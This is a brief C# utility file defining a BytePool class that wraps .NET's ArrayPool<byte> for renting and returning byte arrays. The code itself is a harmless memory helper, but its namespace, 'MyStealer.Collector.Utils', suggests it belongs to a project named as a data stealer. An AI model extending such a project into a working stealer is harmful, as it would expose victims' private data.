﻿using System.Buffers;

namespace MyStealer.Collector.Utils
{
    public static class BytePool
    {
        private static readonly ArrayPool<byte> pool = ArrayPool<byte>.Create();

        public static byte[] Alloc(int size) => pool.Rent(size);

        public static void Free(byte[] array) => pool.Return(array);
    }
}
